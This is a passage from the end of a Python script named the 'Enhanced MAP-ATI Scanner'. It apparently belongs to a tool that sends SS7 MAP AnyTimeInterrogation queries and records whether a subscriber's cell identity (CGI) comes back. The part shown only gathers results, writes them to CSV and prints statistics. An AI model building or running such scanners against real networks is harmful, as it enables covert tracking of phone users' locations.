                    logger.exception(f"Exception in futures.wait: {e}")
                    break
                
                if not done_futures:
                    progress.update(scan_task, description=f"[purple]Active: {len(active_futures)}")
                    continue
                
                for future in done_futures:
                    processed_count += 1
                    progress.update(scan_task, completed=processed_count, 
                                  description=f"[purple]Scan: {processed_count}/{len(tasks)}")
                    
                    orig_task = active_futures.pop(future)
                    
                    try:
                        result = future.result()
                        if result:
                            all_results.append(result)
                            stats['total'] += 1
                            
                            if result.get('success'):
                                stats['success'] += 1
                            if result.get('cgi_found'):
                                stats['cgi_found'] += 1
                            if 'Timeout' in result.get('tcap_outcome', ''):
                                stats['timeouts'] += 1
                            if 'Error' in result.get('tcap_outcome', ''):
                                stats['errors'] += 1
                            
                            # Save to CSV
                            if not args.no_csv:
                                with main_csv_lock:
                                    with open(master_csv, 'a', newline='', encoding='utf-8') as f:
                                        row_data = []
                                        for header in csv_headers:
                                            value = str(result.get(header, "")).replace(",", " ").replace("\n", " ")
                                            row_data.append(value)
                                        f.write(",".join(row_data) + "\n")
                        
                    except Exception as exc:
                        logger.error(f"Task exception: {exc}", exc_info=True)
    
    # Display final statistics
    logger.info("Scan finished.")
    console.print(Panel(Text("Scan Complete", style="bold green justify"), border_style="green", expand=False))
    
    console.print(f"Total tasks: {stats['total']}")
    console.print(f"Successful responses: [bold cyan]{stats['success']}[/]")
    console.print(f"CGI found: [bold green]{stats['cgi_found']}[/]")
    console.print(f"Timeouts: [red]{stats['timeouts']}[/]")
    console.print(f"Errors: [red]{stats['errors']}[/]")
    console.print(f"Results in: [bold green]{results_dir.resolve()}[/]")

if __name__ == "__main__":
    if sys.version_info < (3, 7):
        print("This script requires Python 3.7+.")
        sys.exit(1)
    
    print("🚀 Starting Enhanced MAP-ATI Scanner...")
    main()
